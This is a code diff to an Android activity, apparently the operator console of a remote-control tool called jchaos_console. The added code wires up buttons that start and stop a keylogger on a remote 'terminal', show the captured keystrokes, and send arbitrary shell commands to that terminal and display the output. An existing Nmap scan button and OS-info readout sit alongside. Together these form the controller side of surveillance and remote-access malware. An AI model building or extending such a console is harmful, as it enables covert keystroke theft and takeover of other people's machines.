@@ -10,6 +10,7 @@ import android.os.Looper;
 import android.os.Message;
 import android.view.View;
 import android.widget.Button;
+import android.widget.EditText;
 import android.widget.TextView;
 
 import com.example.jchaos_console.Config.Config;
@@ -29,6 +30,11 @@ public class TerminalControlActivity extends AppCompatActivity {
     private TextView getOsText;
     private Handler myHandler;
     private Button StartKeyLoggerButton;
+    private Button EndKeyLoggerButton;
+    private TextView KeyLoggerTextView;
+    private EditText cmdEditTextView;
+    private TextView cmdShowTextView;
+    private Button execCmdButton;
 
 
     @Override
@@ -45,14 +51,34 @@ public class TerminalControlActivity extends AppCompatActivity {
         myHandler = new Handler(Looper.getMainLooper()) {
             @Override
             public void handleMessage(Message msg) {
+                String jsonstring;
                 switch (msg.what) {
                     case 123:
 
                     case Config.Result_Code_ReturnOsInfo:
-                        String jsonstring = (String) msg.getData().get("osInfoString");
-                        System.out.println("wdnmd："+jsonstring);
-                        //getOsText.setText("wdnmd");
+                        jsonstring = (String) msg.getData().get("osInfoString");
+                        System.out.println("wdnmd：" + jsonstring);
+
                         getOsText.setText(jsonstring);
+                        break;
+                    case Config.Result_Code_ReturnKeyLogger:
+                        jsonstring = (String) msg.getData().get("osInfoString");
+                        if (jsonstring.equals("")) {
+                            KeyLoggerTextView.setText("没有监听到消息");
+                        } else {
+                            KeyLoggerTextView.setText("键盘监听信息：" + jsonstring);
+                        }
+                        break;
+                    case Config.Request_Code_Result_Code_Cmd:
+                        jsonstring = (String) msg.getData().get("osInfoString");
+                        if (jsonstring.equals("")) {
+                            cmdShowTextView.setText("没有监听到消息");
+                        } else {
+                            cmdShowTextView.setText("CMD返回信息：" + jsonstring);
+                        }
+                        break;
+
+
                     default:
                         break;
                 }
@@ -69,6 +95,12 @@ public class TerminalControlActivity extends AppCompatActivity {
         NmapButton = findViewById(R.id.NmapButton);
         NmapView = findViewById(R.id.NmapText);
         getOsText = findViewById(R.id.TerminalGetOsInfo);
+        StartKeyLoggerButton = findViewById(R.id.StartKeyLoggerButton);
+        EndKeyLoggerButton = findViewById(R.id.EndKeyLoggerButton);
+        KeyLoggerTextView = findViewById(R.id.KeyLoggerTextView);
+        cmdEditTextView = findViewById(R.id.CmdEditTextView);
+        cmdShowTextView = findViewById(R.id.CmdShowTextView);
+        execCmdButton = findViewById(R.id.ExecCmdButton);
         setListener();
         initView();
     }
@@ -108,6 +140,78 @@ public class TerminalControlActivity extends AppCompatActivity {
                     }
                 }).start();
 
+            }
+        });
+
+        StartKeyLoggerButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                new Thread(new Runnable() {
+                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+                    @Override
+                    public void run() {
+
+                        String resultCode = terminalHttp.sendStartKeyLogger(activityInfo.terminalID);
+                        switch (resultCode) {
+                            case "2001":
+                                System.out.println("2001");
+                            case "2002":
+                                System.out.println("2002");
+                        }
+                    }
+                }).start();
+            }
+        });
+
+        EndKeyLoggerButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                new Thread(new Runnable() {
+                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+                    @Override
+                    public void run() {
+
+                        String resultMsg = terminalHttp.sendEndKeyLogger(activityInfo.terminalID);
+                        if (resultMsg == null) {
+                            System.out.println("no msg");
+                        }
+                        System.out.println("returnString:" + resultMsg);
+                        System.out.println(resultMsg);
+                        Bundle bundle = new Bundle();
+                        bundle.putSerializable("osInfoString", resultMsg);
+                        Message message = new Message();
+                        message.setData(bundle);
+                        message.what = Config.Result_Code_ReturnKeyLogger;
+                        myHandler.sendMessage(message);
+                        switch (resultMsg) {
+                            case "2004":
+                                System.out.println("2004");
+                            case "2003":
+                                System.out.println("2003");
+
+                        }
+                    }
+                }).start();
+            }
+        });
+
+        execCmdButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                new Thread(new Runnable() {
+                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+                    @Override
+                    public void run() {
+                        String resultMsg = terminalHttp.execCmdCommand(activityInfo.terminalID, cmdEditTextView.getText().toString());
+                        System.out.println(cmdEditTextView.getText().toString());
+                        Bundle bundle = new Bundle();
+                        bundle.putSerializable("osInfoString", resultMsg);
+                        Message message = new Message();
+                        message.setData(bundle);
+                        message.what = Config.Request_Code_Result_Code_Cmd;
+                        myHandler.sendMessage(message);
+                    }
+                }).start();
             }
         });
 
